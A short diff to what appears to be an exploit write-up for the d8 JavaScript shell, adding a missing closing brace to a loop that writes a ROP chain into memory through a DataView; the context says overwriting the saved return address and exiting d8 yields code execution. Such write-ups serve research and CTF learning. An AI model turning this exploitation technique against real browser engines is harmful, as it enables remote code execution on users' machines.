@@ -573,6 +573,7 @@ let rop_chain = [
 let stack_pos = 0
 for (let i = 0; i < rop_chain.length; i++) {
   dataview.setBigUint64(i*8, rop_chain[i], true)
+}
 ```
 
 After overwriting the saved rip, exiting the `d8` binary will trigger the RCE.
